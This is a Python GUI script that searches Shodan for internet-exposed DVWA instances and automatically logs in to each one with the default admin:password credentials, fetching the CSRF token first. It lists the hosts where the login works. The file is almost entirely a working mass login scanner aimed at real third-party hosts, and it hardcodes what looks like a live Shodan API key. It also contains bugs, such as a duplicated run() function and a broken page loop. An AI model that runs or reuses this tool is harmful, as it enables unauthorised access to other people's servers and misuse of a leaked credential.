# import modules
import tkinter as tk
from tkinter import messagebox
import shodan
import time
import requests
import re
import threading
import sys

# your shodan API key
#SHODAN_API_KEY = '<YOUR_SHODAN_API_KEY_HERE>'
SHODAN_API_KEY = '3q8ABKb2BcKtwBlbqW4Cewc7DmxriNOj'
api = shodan.Shodan(SHODAN_API_KEY)

# --- Classes ---

class Redirect():

    def __init__(self, widget, autoscroll=True):
        self.widget = widget
        self.autoscroll = autoscroll

    def write(self, text):
        self.widget.insert('end', text)
        if self.autoscroll:
            self.widget.see("end")  # autoscroll
        
    def flush(self):
        pass

# --- Functions ---

def run():
    threading.Thread(target=process_page).start()

# requests a page of data from shodan
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)
 
# tkinter object
#master = tk(className=' DVWA Search')
 
# Try the default credentials on a given instance of DVWA, simulating a real user trying the credentials
# visits the login.php page to get the CSRF token, and tries to login with admin:password
def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print("[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    # search the CSRF token using regex
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        # Redirects to index.php, we expect an authentication success
        return True
    else:
        return False

# Takes a page of results, and scans each of them, running has_valid_credentials
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    print("Thread: End")
    return result

# searches on shodan using the given query, and iterates over each page of the results
def query_shodan(query):
    print("[*] querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        # break just in your testing, API queries have monthly limits
        break
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

def run():
    threading.Thread(target=begin_test).start()

def begin_test():
    print("Thread: Start")
    # search for DVWA instances
    res = query_shodan('title:dvwa')
    print(res)


# --- Main ---

root = tk.Tk(className=' DVWA Search')

# - Frame with Text and Scrollbar -

frame = tk.Frame(root)
frame.pack(expand=True, fill='both')

text = tk.Text(frame)
text.pack(side='left', fill='both', expand=True)

scrollbar = tk.Scrollbar(frame)
scrollbar.pack(side='right', fill='y')

text['yscrollcommand'] = scrollbar.set
scrollbar['command'] = text.yview

old_stdout = sys.stdout
sys.stdout = Redirect(text)

# - rest -

button = tk.Button(root, text='Run Query', command=run)
button.pack()

root.mainloop()